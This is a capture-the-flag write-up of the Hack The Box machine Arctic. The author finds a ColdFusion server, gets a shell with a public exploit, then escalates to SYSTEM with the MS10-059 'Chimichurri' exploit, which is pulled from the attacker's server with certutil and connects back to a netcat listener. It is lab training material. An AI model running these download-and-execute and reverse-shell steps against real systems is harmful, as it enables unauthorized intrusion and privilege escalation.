### HTB Arctic 10.10.10.11

Ok, we're back with another box.  This time it's HTB Arctic.  Trying to do this one with no assistance.  Or if I need any lookup points, to make note.  So let's get to it.  We'll start off like normal.  Nmaping our way through the world.  One box at a time.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.11                     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 06:31 EDT
Nmap scan report for 10.10.10.11
Host is up (0.045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 96.01 seconds
```

3 ports to work with.  Let's take a closer look.

```
(kali@kali)-$ sudo nmap -A -p 135,8500,49154 10.10.10.11  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 06:34 EDT
Nmap scan report for 10.10.10.11
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|8|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows 7 (88%), Microsoft Windows 7 Professional or Windows 8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 49154/tcp)
HOP RTT      ADDRESS
1   46.99 ms 10.10.14.1
2   47.08 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.93 seconds
```

So 2 of the 3 are remote desktop ports.  What's this 8500, fmtp though.  Just curious.  Let's try a web browser and see what comes back there.

![Browser Pic](/Images/HTB6Arctic/pic1.png)

Interesting.  So, do some searching on cfide and cfdocs and turns out that this appears to be a Cold Fusion server.  Wonder if there are any exploits.  After some googleing, it appears there is.  I found a python script at https://www.exploit-db.com/exploits/50057, plugged in my info where I needed to, ran it and wouldn't ya know it.  Worked like a charm.

![Python Connect](/Images/HTB6Arctic/pic2.png)

It also looks like we're a user on the device.  `tolis` is the account name.  Go get the flag cause that's just the fun little cookie at the end.  But this isn't the end.  Let's go own it now.

So since we have a shell now, we can get the `systeminfo` and go through the exploit suggester.

```
(kali@kali)-$ python2 ./windows-exploit-suggester.py --database 2024-10-29-mssb.xls --systeminfo sysinfo.txt   
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

In a live test, we might check all of these, but I see one that is familiar.  MS10-059.  Also call Chimichurri.  Run a google search on MS10-059 and it gives us a github page among others.

Download the exploit from the webpage (the .exe file) and then use our python server skills to start up a python web server.  Then use certutil to download the file onto the target machine.

```
C:\Users\tolis\Documents>certutil.exe -urlcache -f http://10.10.x.x/Chimichurri.exe chimi.exe
certutil.exe -urlcache -f http://10.10.x.x/Chimichurri.exe chimi.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Users\tolis\Documents

04/11/2024  04:45 ��    <DIR>          .
04/11/2024  04:45 ��    <DIR>          ..
04/11/2024  04:45 ��           784.384 chimi.exe
               1 File(s)        784.384 bytes
               2 Dir(s)   1.431.838.720 bytes free
```

Now that that's there, we can run it since we made sure it was in a folder we could do that from.

```
C:\Users\tolis\Documents>chimi.exe
chimi.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
```

Ahh, so we need a listener and some options.  Start a netcat listener on our machine and then we're in.

![chimi.exe](/Images/HTB6Arctic/pic3.png)

And let's check our netcat window.

![ownage!](/Images/HTB6Arctic/pic4.png)

And as we can see here, we have owned the machine.  Go get the flag off the desktop and we've now owned this box too!!

This was another fun one!  HTB site went down for me as I was finishing it so I had to wait a bit to actually finish the box.  Maybe when I cracked this one, I brought the whole site down.  HAHA, doubt it, but we hackers can dream, yea?  Until next time kids!